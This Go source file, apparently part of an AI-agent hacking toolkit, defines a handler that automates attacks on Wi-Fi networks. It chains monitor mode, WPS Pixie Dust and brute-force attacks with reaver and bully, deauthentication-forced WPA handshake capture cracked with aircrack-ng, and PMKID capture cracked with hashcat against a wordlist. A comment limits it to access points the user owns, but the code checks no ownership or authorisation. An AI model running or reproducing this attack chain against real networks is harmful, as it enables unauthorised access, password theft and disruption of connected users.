package core

import (
	"context"
	"fmt"
	"strings"

	"github.com/samrudh/hack-ai-v2/internal/types"
)

// handleWifiAttack orchestrates a full WPS/WPA2 attack chain against an AP the user owns.
// Steps: monitor mode → wash scan → reaver pixie dust → reaver brute-force fallback.
// All steps run via executePlugin so output is captured and logged.
func (e *Engine) handleWifiAttack(ctx context.Context, args map[string]interface{}) (types.ToolResult, error) {
	iface, _ := args["interface"].(string)
	if iface == "" {
		return errorResult("interface is required (e.g. wlan0 — the USB adapter, not the built-in card)"), nil
	}

	ssid, _ := args["ssid"].(string)
	bssid, _ := args["bssid"].(string)
	channel := 0
	if ch, ok := args["channel"].(float64); ok {
		channel = int(ch)
	}
	attack, _ := args["attack"].(string)
	if attack == "" {
		attack = "wps_pixie" // default: fastest attack first
	}
	wordlist, _ := args["wordlist"].(string)
	if wordlist == "" {
		wordlist = "/usr/share/wordlists/rockyou.txt"
	}

	var out strings.Builder
	out.WriteString("# WiFi Attack Chain\n\n")

	// ── Step 1: enable monitor mode ──────────────────────────────────────────
	out.WriteString("## Step 1: Enable monitor mode\n")
	monPlugin, ok := e.plugins.Get("airmon-ng")
	if !ok {
		return errorResult("airmon-ng plugin not found — is Kali running?"), nil
	}
	monResult, err := e.ExecutePluginFull(ctx, monPlugin, map[string]interface{}{
		"action":    "check kill",
		"interface": iface,
	})
	if err != nil {
		return errorResult(fmt.Sprintf("airmon-ng check kill failed: %v", err)), nil
	}
	out.WriteString(monResult.Content[0].Text + "\n\n")

	monStart, err := e.ExecutePluginFull(ctx, monPlugin, map[string]interface{}{
		"action":    "start",
		"interface": iface,
	})
	if err != nil {
		return errorResult(fmt.Sprintf("airmon-ng start failed: %v", err)), nil
	}
	out.WriteString(monStart.Content[0].Text + "\n\n")

	// Monitor interface is usually <iface>mon (e.g. wlan0 → wlan0mon)
	monIface := iface + "mon"
	out.WriteString(fmt.Sprintf("Monitor interface: **%s**\n\n", monIface))

	// ── Step 2: WPS scan with wash (if bssid not provided) ───────────────────
	if bssid == "" {
		out.WriteString("## Step 2: Scan for WPS-enabled APs (wash)\n")
		washPlugin, ok := e.plugins.Get("wash")
		if !ok {
			return errorResult("wash plugin not found"), nil
		}
		washArgs := map[string]interface{}{"interface": monIface}
		if channel != 0 {
			washArgs["channel"] = float64(channel)
			washArgs["channel_flag"] = fmt.Sprintf("-c %d", channel)
		}
		washResult, err := e.ExecutePluginFull(ctx, washPlugin, washArgs)
		if err != nil {
			return errorResult(fmt.Sprintf("wash failed: %v", err)), nil
		}
		out.WriteString(washResult.Content[0].Text + "\n\n")

		// Try to extract BSSID for the target SSID from wash output
		if ssid != "" {
			for _, line := range strings.Split(washResult.Content[0].Text, "\n") {
				if strings.Contains(strings.ToLower(line), strings.ToLower(ssid)) {
					fields := strings.Fields(line)
					if len(fields) >= 1 && len(fields[0]) == 17 {
						bssid = fields[0]
						if channel == 0 && len(fields) >= 2 {
							fmt.Sscanf(fields[1], "%d", &channel)
						}
						out.WriteString(fmt.Sprintf("Found target: BSSID=%s channel=%d\n\n", bssid, channel))
						break
					}
				}
			}
		}

		if bssid == "" {
			out.WriteString("⚠️  Could not auto-detect BSSID from wash output.\n")
			out.WriteString("Re-run with bssid and channel set explicitly.\n")
			return successResult(out.String()), nil
		}
	} else {
		out.WriteString(fmt.Sprintf("## Step 2: Using provided BSSID=%s channel=%d\n\n", bssid, channel))
	}

	if channel == 0 {
		return errorResult("channel is required when bssid is specified manually"), nil
	}

	// ── Step 3: Attack ────────────────────────────────────────────────────────
	switch attack {
	case "wps_pixie", "wps":
		out.WriteString("## Step 3: WPS Pixie Dust attack (reaver -K 1)\n")
		reaverPlugin, ok := e.plugins.Get("reaver")
		if !ok {
			return errorResult("reaver plugin not found"), nil
		}
		reaverResult, err := e.ExecutePluginFull(ctx, reaverPlugin, map[string]interface{}{
			"interface":  monIface,
			"bssid":      bssid,
			"channel":    float64(channel),
			"pixie_dust": true,
			"pixie_flag": "-K 1",
			"extra_args": "-L -N -d 15 -T 1",
		})
		if err != nil {
			return errorResult(fmt.Sprintf("reaver pixie dust failed: %v", err)), nil
		}
		out.WriteString(reaverResult.Content[0].Text + "\n\n")

		// If pixie dust didn't crack it, fall through to brute-force
		if !strings.Contains(reaverResult.Content[0].Text, "WPA PSK") &&
			!strings.Contains(reaverResult.Content[0].Text, "WPS PIN") {
			out.WriteString("Pixie Dust did not succeed. Running full WPS brute-force...\n\n")
			bruteResult, err := e.ExecutePluginFull(ctx, reaverPlugin, map[string]interface{}{
				"interface":  monIface,
				"bssid":      bssid,
				"channel":    float64(channel),
				"pixie_dust": false,
				"pixie_flag": "",
				"extra_args": "-L -N -d 15 -T 1",
			})
			if err != nil {
				return errorResult(fmt.Sprintf("reaver brute-force failed: %v", err)), nil
			}
			out.WriteString(bruteResult.Content[0].Text + "\n\n")
		}

	case "wps_brute":
		out.WriteString("## Step 3: WPS brute-force (bully)\n")
		bullyPlugin, ok := e.plugins.Get("bully")
		if !ok {
			return errorResult("bully plugin not found — apt-get install bully"), nil
		}
		bullyResult, err := e.ExecutePluginFull(ctx, bullyPlugin, map[string]interface{}{
			"interface": monIface,
			"bssid":     bssid,
			"channel":   float64(channel),
		})
		if err != nil {
			return errorResult(fmt.Sprintf("bully failed: %v", err)), nil
		}
		out.WriteString(bullyResult.Content[0].Text + "\n\n")

	case "handshake":
		// Capture handshake via deauth + airodump-ng, then crack with hashcat
		out.WriteString("## Step 3a: Capture WPA handshake (airodump-ng + aireplay-ng)\n")
		dumpPlugin, ok := e.plugins.Get("airodump-ng")
		if !ok {
			return errorResult("airodump-ng plugin not found"), nil
		}
		capFile := fmt.Sprintf("/tmp/cap_%s", strings.ReplaceAll(bssid, ":", ""))
		dumpResult, err := e.ExecutePluginFull(ctx, dumpPlugin, map[string]interface{}{
			"interface":     monIface,
			"bssid":         bssid,
			"channel":       float64(channel),
			"output_prefix": capFile,
		})
		if err != nil {
			return errorResult(fmt.Sprintf("airodump-ng failed: %v", err)), nil
		}
		out.WriteString(dumpResult.Content[0].Text + "\n\n")

		out.WriteString("## Step 3b: Force handshake (deauth)\n")
		replayPlugin, ok := e.plugins.Get("aireplay-ng")
		if !ok {
			return errorResult("aireplay-ng plugin not found"), nil
		}
		deauthResult, err := e.ExecutePluginFull(ctx, replayPlugin, map[string]interface{}{
			"interface":   monIface,
			"bssid":       bssid,
			"attack":      float64(0),
			"count":       float64(5),
			"client_flag": "",
		})
		if err != nil {
			return errorResult(fmt.Sprintf("aireplay-ng deauth failed: %v", err)), nil
		}
		out.WriteString(deauthResult.Content[0].Text + "\n\n")

		out.WriteString("## Step 3c: Crack handshake (aircrack-ng)\n")
		crackPlugin, ok := e.plugins.Get("aircrack-ng")
		if !ok {
			return errorResult("aircrack-ng plugin not found"), nil
		}
		crackResult, err := e.ExecutePluginFull(ctx, crackPlugin, map[string]interface{}{
			"capture_file": capFile + "-01.cap",
			"bssid":        bssid,
			"wordlist":     wordlist,
		})
		if err != nil {
			return errorResult(fmt.Sprintf("aircrack-ng failed: %v", err)), nil
		}
		out.WriteString(crackResult.Content[0].Text + "\n\n")

	case "pmkid":
		// Passive PMKID capture, no deauth
		out.WriteString("## Step 3a: PMKID capture (hcxdumptool)\n")
		hcxPlugin, ok := e.plugins.Get("hcxdumptool")
		if !ok {
			return errorResult("hcxdumptool not found — apt-get install hcxdumptool"), nil
		}
		capFile := fmt.Sprintf("/tmp/pmkid_%s.pcapng", strings.ReplaceAll(bssid, ":", ""))
		filterFlag := fmt.Sprintf("--filterlist_ap=%s --filtermode=2", bssid)
		hcxResult, err := e.ExecutePluginFull(ctx, hcxPlugin, map[string]interface{}{
			"interface":   monIface,
			"output_file": capFile,
			"filter_flag": filterFlag,
		})
		if err != nil {
			return errorResult(fmt.Sprintf("hcxdumptool failed: %v", err)), nil
		}
		out.WriteString(hcxResult.Content[0].Text + "\n\n")

		out.WriteString("## Step 3b: Convert to hashcat format (hcxpcapngtool)\n")
		convPlugin, ok := e.plugins.Get("hcxpcapngtool")
		if !ok {
			return errorResult("hcxpcapngtool not found — apt-get install hcxtools"), nil
		}
		hashFile := capFile + ".hc22000"
		convResult, err := e.ExecutePluginFull(ctx, convPlugin, map[string]interface{}{
			"input_file":  capFile,
			"output_file": hashFile,
		})
		if err != nil {
			return errorResult(fmt.Sprintf("hcxpcapngtool failed: %v", err)), nil
		}
		out.WriteString(convResult.Content[0].Text + "\n\n")

		out.WriteString("## Step 3c: Crack PMKID (hashcat -m 22000)\n")
		hashcatPlugin, ok := e.plugins.Get("hashcat")
		if !ok {
			return errorResult("hashcat not found — apt-get install hashcat"), nil
		}
		hashcatResult, err := e.ExecutePluginFull(ctx, hashcatPlugin, map[string]interface{}{
			"hash_file": hashFile,
			"wordlist":  wordlist,
			"mode":      float64(22000),
			"rule_flag": "",
		})
		if err != nil {
			return errorResult(fmt.Sprintf("hashcat failed: %v", err)), nil
		}
		out.WriteString(hashcatResult.Content[0].Text + "\n\n")

	default:
		return errorResult(fmt.Sprintf("unknown attack type: %s (valid: wps_pixie, wps_brute, handshake, pmkid)", attack)), nil
	}

	// ── Step 4: restore managed mode ─────────────────────────────────────────
	out.WriteString("## Step 4: Restore managed mode\n")
	monPlugin2, _ := e.plugins.Get("airmon-ng")
	if monPlugin2 != nil {
		stopResult, _ := e.ExecutePluginFull(ctx, monPlugin2, map[string]interface{}{
			"action":    "stop",
			"interface": monIface,
		})
		out.WriteString(stopResult.Content[0].Text + "\n")
	}

	return successResult(out.String()), nil
}
